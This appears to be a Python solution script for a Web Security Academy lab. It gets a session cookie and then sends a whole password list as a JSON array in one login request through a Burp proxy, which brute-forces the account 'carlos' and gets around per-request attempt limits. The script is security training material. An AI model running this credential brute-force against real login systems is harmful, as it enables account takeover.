import requests


def get_cookies(settings):
    """Retrieve cookies automatically from the initial GET request."""
    session = settings["session"]
    url = settings["base_url"]
    ca_cert_path = settings["ca_cert_path"]
    print(f"Using CA cert path: {ca_cert_path}")
    try:
        # Make a GET request to fetch cookies
        response = session.get(url, verify=ca_cert_path)
        response.raise_for_status()  # Raise an HTTPError for bad responses (4xx and 5xx)
        
        print("Initial GET request successful.")
        
        # Retrieve all cookies
        all_cookies = session.cookies.get_dict()
        print(f"Retrieved all cookies: {all_cookies}")
        
        # Extract the "session" cookie
        session_cookie = all_cookies.get("session", None)
        print(f"Session cookie: {session_cookie}")
        
        return session_cookie  # Return just the "session" cookie
    
    except requests.exceptions.SSLError as e:
        print(f"SSL Error: {e}")
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")
    
    return None  # Return None if cookies could not be retrieved
    
        
def load_password_list():
    try:
        with open("res/passwords.txt", "r") as file:
            return [line.strip() for line in file]
    except FileNotFoundError:
        print("Password file not found.")
        return []
    
        
def test_password_batch(settings, passwords):
    """Test a batch of passwords by sending them in a single request."""
    session_cookie = get_cookies(settings)
    headers = {
        "Cookie": f"session={session_cookie}",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36",
        "Content-Type": "application/json",
        "Accept": "*/*",
        "Referer": f"{settings['base_url']}{settings['login_endpoint']}",
    }

    payload = {
        "username": settings["target_username"],
        "password": passwords  # Send multiple passwords in one request
    }

    try:
        response = settings["session"].post(
            f"{settings['base_url']}{settings['login_endpoint']}",
            json=payload,
            headers=headers,
            proxies=settings["burp_proxy"],
            verify=settings["ca_cert_path"],
            allow_redirects=False,
        )

        if response.status_code == 302:
            print(f"Valid password found in batch. {response.status_code} {response.text}")
        elif response.status_code == 200:
            print(f"Batch processed but no valid password.{response.status_code} {response.text}")
        else:
            print(f"Unexpected response: {response.status_code} {response.text}")
    except requests.RequestException as e:
        print(f"Request failed for batch: {passwords}: {e}")
    return None


def main():
    settings = {
        "base_url": "https://0af200fc04a4956a8123cf2e00a600ba.web-security-academy.net",
        "login_endpoint": "/login",
        "target_username": "carlos",
        "burp_proxy": {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"},
        "ca_cert_path": "certs/burp_cacert_chain.pem",
        "session": requests.Session(),
        "cookie": None,
    }
    
    test_password_batch(settings, load_password_list())

    print("Check Burp SUite for redirect and open URL in browser.")

if __name__ == "__main__":
    main()